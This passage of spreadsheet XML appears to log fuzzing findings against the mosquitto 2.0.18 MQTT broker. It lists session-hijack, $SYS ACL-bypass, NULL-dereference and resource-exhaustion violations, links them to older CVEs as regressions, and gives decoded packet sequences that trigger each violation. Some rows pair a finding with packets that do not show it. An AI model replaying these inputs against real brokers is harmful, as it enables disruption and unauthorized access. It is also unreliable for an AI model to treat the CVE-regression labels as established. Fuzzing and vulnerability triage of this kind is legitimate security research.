raw_header=35353535353535353535353535353535\u000aMsg[15]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[16]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[17]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[18]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[19]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[20]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[21]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[22]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[23]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[24]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[25]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000a(尾部2811B): 3535353535353535353535353535353535353535353535353535353535353535353535353535353535353535353535353535</f>
        <v/>
      </c>
      <c r="F1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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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6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67">
      <c r="A167" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:3,cat:02c4</t>
        </is>
      </c>
      <c r="B167" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C167" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(23305B)\u000a4.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0x02c4\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E167" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:02c4 ===\u000a大小: 6707B (报告+请求数据)\u000a请求数据: 23305B\u000a\u000a---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MQTT请求序列(23305B原始二进制) ---\u000aMsg[1]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[2]: DISCONNECT 断开连接 | raw_header=e000\u000aMsg[3]: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reason_code=99 | raw_header=26262663636363636363636363636363\u000aMsg[8]: PUBREL PacketID=25443 | raw_header=63636363636363636363636363636363\u000aMsg[9]: PUBREL PacketID=25443 | raw_header=63636363636363636363636363636363\u000aMsg[10]: PUBREL PacketID=25443 | raw_header=63636363636363636363636363636363\u000aMsg[11]: PUBREL PacketID=25443 | raw_header=63636363636363636363636363636363\u000aMsg[12]: PUBREL PacketID=25443 | raw_header=63636363636363636363636363636363\u000aMsg[13]: PUBREL PacketID=25443 | raw_header=63636363636363636363636363636363\u000aMsg[14]: PUBREL PacketID=25443 | raw_header=63636363636363636363636363636363\u000aMsg[15]: PUBREL PacketID=25443 | raw_header=63636363636363636363636363636363\u000aMsg[16]: PUBREL PacketID=25443 | raw_header=63636363636363636363636363636363\u000aMsg[17]: (不完整,4402B) raw=68be6363636363636363636363636363636363636363636363636363636363636363636363636363\u000a(尾部4402B): 68be636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363</f>
        <v/>
      </c>
      <c r="F1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6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67" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J16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16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8">
      <c r="A168" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:3,cat:0305</t>
        </is>
      </c>
      <c r="B168" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C168" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(1447B)\u000a4.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0x0305\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E168" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0305 ===\u000a大小: 3613B (报告+请求数据)\u000a请求数据: 1447B\u000a\u000a---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MQTT请求序列(1447B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1 Topics=['\x7f#sÁÁ\x01'(QoS=3)] | raw_header=820b000100067f2373c1c10103\u000aMsg[2]: TYPE0  | raw_header=00ff00807a5f7a338239085a007fff00\u000aMsg[3]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[4]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3c3a3a3a\u000aMsg[5]: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raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a003a3a\u000aMsg[8]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[9]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a7a3a3a3a\u000aMsg[10]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[11]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a10003a3a\u000aMsg[12]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a013a3a\u000aMsg[13]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[14]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a373a3a3a\u000aMsg[15]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a63000d77296c6c2f\u000aMsg[16]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=146465766963652f2b2f74656c656d65\u000aMsg[17]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[18]: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raw_header=3a3a3a3a3a3a3a3a523a3a3a3a3a3a3a\u000aMsg[21]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[22]: CONNACK  | raw_header=2000\u000aMsg[23]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=152473766172652f6772702f74757374\u000aMsg[24]: (不完整,82B) raw=545f310006746573742f23001000064bffe22301001c2473686172653a67000e461151b9ffa02183\u000a(尾部82B): 545f310006746573742f23001000064bffe22301001c2473686172653a67000e461151b9ffa02183312a2b76195c17c82600</f>
        <v/>
      </c>
      <c r="F1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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J16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6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69">
      <c r="A169" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:3,cat:0307</t>
        </is>
      </c>
      <c r="B169" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C169" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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将种子文件(id:000008,sev:3,cat:0307)中的REQUEST DATA提取出来(142B)\u000a4.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169" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0307 ===\u000a大小: 979B (报告+请求数据)\u000a请求数据: 142B\u000a\u000a---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MQTT请求序列(142B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=4 Topics=[] | raw_header=821300044d5154540402003c00076675\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=['test/#'(QoS=0)] | raw_header=820b00010006746573742f2300\u000aMsg[3]: PUBLISH Topic='test\x1ba' QoS=0 retain=False payload='hello' | raw_header=300d0006746573741b6168656c6c6f\u000aMsg[4]: UNSUBSCRIBE  | raw_header=a20a00020006746573741c23\u000aMsg[5]: PUBLISH Topic='test/b' QoS=2 retain=False payload='\x00\x04hello2' | raw_header=34100006746573742f62000468656c6c\u000aMsg[6]: PUBREC PacketID=3 | raw_header=50020003\u000aMsg[7]: PUBREL PacketID=3 | raw_header=62020003\u000aMsg[8]: PUBCOMP PacketID=3 | raw_header=70020003\u000aMsg[9]: PINGREQ  | raw_header=c000\u000aMsg[10]: PUBLISH Topic='very/¢%\x00\x9d\x00\x00\x01t\x00\x1d$SYS/broker/clients/connecte' QoS=0 retain=False payload='' | raw_header=302d002b766572792fa225009d000001\u000aMsg[11]: PUBREL  | raw_header=6400</f>
        <v/>
      </c>
      <c r="F1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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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70">
      <c r="A170" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:3,cat:0385</t>
        </is>
      </c>
      <c r="B170" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C170" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(1474B)\u000a4.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170" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0385 ===\u000a大小: 4489B (报告+请求数据)\u000a请求数据: 1474B\u000a\u000a---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MQTT请求序列(1474B原始二进制) ---\u000aMsg[1]: PUBACK PacketID=1 | raw_header=420b000100576573c17ef520ff\u000aMsg[2]: PINGREQ  | raw_header=c000\u000aMsg[3]: TYPE0  | raw_header=0400\u000aMsg[4]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=142473686172652f677270322f73656e\u000aMsg[5]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=31313131313131313131313131313131\u000aMsg[6]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=31313131313131313131313131313131\u000aMsg[7]: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PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=31313131313131313131313131313131\u000aMsg[11]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=31313131313131313131313131313131\u000aMsg[12]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=31313173656e736f722f230100142473\u000aMsg[13]: PUBREL PacketID=29743 | raw_header=6573742f746f706963005bc341f6db2f\u000aMsg[14]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=31313131313131313131313131313131\u000aMsg[15]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=31313131313131313131313131312931\u000aMsg[16]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=31313131313131313131313131313131\u000aMsg[17]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=31313131313131313131313131313131\u000aMsg[18]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=31313131313131313131313131313131\u000aMsg[19]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=31313131313131313131313131313131\u000aMsg[20]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=31313131313131313131313131313131\u000aMsg[21]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=31313131313131313131313131313131\u000aMsg[22]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=31313131313131313131313131313131\u000aMsg[23]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=31313131313131313131313131313131\u000aMsg[24]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=31313131313131313131313131313131\u000aMsg[25]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=31313131313131313131313131313131\u000a(尾部282B): 31313131313131311a3131313131313131313131313131313131313131313131313131313131313131313331313131313131</f>
        <v/>
      </c>
      <c r="F1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7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70" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J17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7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71">
      <c r="A171" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:3,cat:0386</t>
        </is>
      </c>
      <c r="B171" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C171" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(604B)\u000a4.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171" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0386 ===\u000a大小: 1971B (报告+请求数据)\u000a请求数据: 604B\u000a\u000a---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MQTT请求序列(604B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=4112s [自动清理会话] | raw_header=101300044d5154540402101000000075\u000aMsg[2]: SUBSCRIBE PacketID=0 Topics=['+/data'(QoS=2), '$share/gà\x00\x00úsensor/#'(QoS=1), '$share/grp2/sensor/#'(QoS=1)] | raw_header=8239000000062b2f6461746102001424\u000aMsg[3]: PUBLISH Topic='$share/grp/test/topic' QoS=2 retain=True payload='\x00[Ã\x1föÛ/Y\x99' | raw_header=352000152473686172652f6772702f74\u000aMsg[4]: PUBLISH Topic='MQTT' QoS=2 retain=False payload='\x04\x02æ;\x00\x07fuzz_c4' | raw_header=341300044d5154540402e63b00076675\u000aMsg[5]: PUBLISH Topic='eest9retained' QoS=0 retain=True payload='keep_me' | raw_header=3116000d656573743972657461696e65\u000aMsg[6]: SUBSCRIBE PacketID=282 Topics=['test/topic'(QoS=0)] | raw_header=820f011a000a746573742f746f706963\u000aMsg[7]: PUBLISH Topic='$SYS/broker/ve\x82\x82\x01\x00\u0009' QoS=2 retain=False payload_len=58B | raw_header=3c4f0013245359532f62726f6b65722f\u000aMsg[8]: PUBCOMP PacketID=19 | raw_header=74610013245359532f62726f6b65722f\u000aMsg[9]: SUBACK PacketID=36643 reason_codes=[253,38,8,0,21,36,115,104,97,114,101,47,103,114,112,47,116,101,115,116,47,116,111,112,105,99,11,173,186,159,45,38,0,0,0,0,124,122,171,141,157,147,53,66,243,143,9,235,214,189,222,250,84,174,137,24,212,253,63,118,172,108,249] | raw_header=90418f23fd260800152473686172652f\u000aMsg[10]: UNSUBSCRIBE  | raw_header=aa463365c2ad104f4aa4858d97149682\u000aMsg[11]: (不完整,109B) raw=8f9354b0b7979e94ab4d50ac072c2c201c63a1c24f33cc82120002000d746573742f72657461696e\u000a(尾部109B): 8f9354b0b7979e94ab4d50ac072c2c201c63a1c24f33cc82120002000d746573742f72657461696e02e63b000766757a7a5f</f>
        <v/>
      </c>
      <c r="F1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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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72">
      <c r="A172" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:3,cat:0387</t>
        </is>
      </c>
      <c r="B172" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C172" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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将种子文件(id:000008,sev:3,cat:0387)中的REQUEST DATA提取出来(18668B)\u000a4.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0x0387\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E172" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0387 ===\u000a大小: 7191B (报告+请求数据)\u000a请求数据: 18668B\u000a\u000a---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MQTT请求序列(18668B原始二进制) ---\u000aMsg[1]: AUTH  | raw_header=ff3d3d3d3d3d3d3d3d3d3d3d00100010\u000aMsg[2]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d\u000aMsg[3]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d\u000aMsg[4]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d\u000aMsg[5]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d\u000aMsg[6]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d\u000aMsg[7]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d\u000aMsg[8]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d\u000aMsg[9]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d\u000aMsg[10]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d\u000aMsg[11]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d\u000aMsg[12]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d\u000aMsg[13]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d\u000aMsg[14]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d\u000aMsg[15]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d\u000aMsg[16]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d\u000aMsg[17]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d\u000aMsg[18]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d\u000aMsg[19]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d\u000aMsg[20]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d\u000aMsg[21]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d\u000aMsg[22]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d\u000aMsg[23]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d\u000aMsg[24]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d\u000aMsg[25]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d\u000a(尾部2559B): 3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d</f>
        <v/>
      </c>
      <c r="F1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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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73">
      <c r="A173" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:3,cat:03c5</t>
        </is>
      </c>
      <c r="B173" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C173" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D1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将种子文件(id:000008,sev:3,cat:03c5)中的REQUEST DATA提取出来(1814B)\u000a4.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0x03c5\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E173" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:03c5 ===\u000a大小: 2696B (报告+请求数据)\u000a请求数据: 1814B\u000a\u000a---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CVE=N/A)\u000a\u000a--- MQTT请求序列(1814B原始二进制) ---\u000aMsg[1]: PUBREL PacketID=26728 | raw_header=68516868615e680cff7f00000c0c0c0c\u000aMsg[2]: PUBREL PacketID=26728 | raw_header=68686868684768715868686868686868\u000aMsg[3]: TYPE0  | raw_header=0c0c0c0c0c0c0c0c000000000c0c\u000aMsg[4]: TYPE0  | raw_header=0c0c0c0c0c0c0c0c0c0c0c0c0c0c\u000aMsg[5]: TYPE0  | raw_header=0c0c0c0c0d0c0c270c400c0c0c0c\u000aMsg[6]: TYPE0  | raw_header=0c0c0c0c0c0c0c0c0c0c0c0c0c0c\u000aMsg[7]: TYPE0  | raw_header=0c0c0c0c0c0c0c0c0c0c0c0c0c0c\u000aMsg[8]: TYPE0  | raw_header=0c0c0c0c0c0c0c0c0c0c0c0c0c0c\u000aMsg[9]: AUTH  | raw_header=f40b0c0c0c0c0c0c0c0c0c0c0c\u000aMsg[10]: TYPE0  | raw_header=0f0c0c0c0c0c0c0c0c0c0c0c0c0c\u000aMsg[11]: TYPE0  | raw_header=0c0c0c0c0c0c0c0c0c0c0c0c0c0c\u000aMsg[12]: TYPE0  | raw_header=0c0c0c0c070c0c0c0c0c0c0c0c0c\u000aMsg[13]: TYPE0  | raw_header=0c0c0c0c0c0c0c0c0c0c0c0c0c0c\u000aMsg[14]: TYPE0  | raw_header=0c0c0c0c0cfa0000fa0c0c0c0c0c\u000aMsg[15]: TYPE0  | raw_header=0c0c0c0c0c0c0c0c0c0c0c0c0c0c\u000aMsg[16]: TYPE0  | raw_header=0c0c0c0c0c0c0c0c0c0c0c0c0c0c\u000aMsg[17]: TYPE0  | raw_header=0c0c0c0c0c0c0c0bfe0c0c0c0c0c\u000aMsg[18]: TYPE0  | raw_header=0c0c0c0c0c0c0c0c0c0c0c0c0c0c\u000aMsg[19]: TYPE0  | raw_header=0c686868686867686268686868686868\u000aMsg[20]: TYPE0  | raw_header=0c0c0c0c0c0c0c0c0c0c0c0c0c0c\u000aMsg[21]: TYPE0  | raw_header=0c0c0c0c0c0c0c0c0c0c0c0c0c0c\u000aMsg[22]: TYPE0  | raw_header=0c0c0c0c0c0c000000000c0c0c0c\u000aMsg[23]: TYPE0  | raw_header=0c00\u000aMsg[24]: PUBACK PacketID=3084 | raw_header=400c0c0c0c0c0c0c0c0c0c0c0c0c\u000aMsg[25]: TYPE0  | raw_header=0c0c0c270c400c0c0c0c0c0c0c0c\u000a(尾部1224B): 0c0c0c0c0c0c0c0c0c0c0c0c262626262626262626262626262626262626262626262626262626260c0c0c0c0c0c0c0c0c0c</f>
        <v/>
      </c>
      <c r="F1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7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73" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J17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7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74">
      <c r="A174" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B174" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C174" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(21B)\u000a4.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74" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0040 ===\u000a大小: 397B (报告+请求数据)\u000a请求数据: 21B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(21B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v127 ClientID=''(117B) clean_session=False keepalive=20483s [持久会话] | raw_header=101300044d5154547f005003c20d0075</f>
        <v/>
      </c>
      <c r="F1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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J17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7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75">
      <c r="A175" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:4,cat:0042</t>
        </is>
      </c>
      <c r="B175" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C175" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(376B)\u000a4.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75" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0042 ===\u000a大小: 899B (报告+请求数据)\u000a请求数据: 376B\u000a\u000a---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MQTT请求序列(376B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1 Topics=['test/#'(QoS=2)] | raw_header=820b00010006746573742f2302\u000aMsg[2]: PUBLISH Topic='test/c' QoS=2 retain=False payload='\x00\x14da+/' | raw_header=340e0006746573742f63001464612b2f\u000aMsg[3]: PUBREL PacketID=29793 | raw_header=646174610200142473686172652f6772\u000aMsg[4]: TYPE0  | raw_header=0200\u000aMsg[5]: PUBLISH  | raw_header=3c00\u000aMsg[6]: TYPE0  | raw_header=0766753116000d746573742f72657461\u000aMsg[7]: SUBSCRIBE PacketID=466 Topics=['+/data'(QoS=2), ''(零长度!QoS=0), '$share/grp/test/topic'(QoS=1)] | raw_header=822601d200062b2f6461746102000000\u000aMsg[8]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=False payload_len=62B | raw_header=3c530013245359532f62726f6b65722f\u000aMsg[9]: (不完整,15B) raw=e06f706963005bc341f6db2f599900\u000a(尾部15B): e06f706963005bc341f6db2f599900</f>
        <v/>
      </c>
      <c r="F1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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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76">
      <c r="A176" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B176" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C176" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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76" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:00c0 ===\u000a大小: 1926B (报告+请求数据)\u000a请求数据: 110B\u000a\u000a---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MQTT请求序列(110B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=535 Topics=['$SYS/broker/version'(QoS=1), '$share/grp1/test/+'(QoS=2), ''(零长度!QoS=1)] | raw_header=823002170013245359532f62726f6b65\u000aMsg[2]: PUBLISH Topic='t' QoS=0 retain=True payload='ÎÉ-÷¯¤Ò\x9e\x13\x98ÃþÂXb¿ü{\x1aÍp\x86§\x8bÕ\x9b¬\x90Pã÷\x1e¬$\x15\Èç' | raw_header=3929000174cec92df7afa4d29e1398c3\u000aMsg[3]: (不完整,17B) raw=3046000a7465730000001423fafa342233\u000a(尾部17B): 3046000a7465730000001423fafa342233</f>
        <v/>
      </c>
      <c r="F1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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J17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7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77">
      <c r="A177" s="2" t="inlineStr">
        <is>
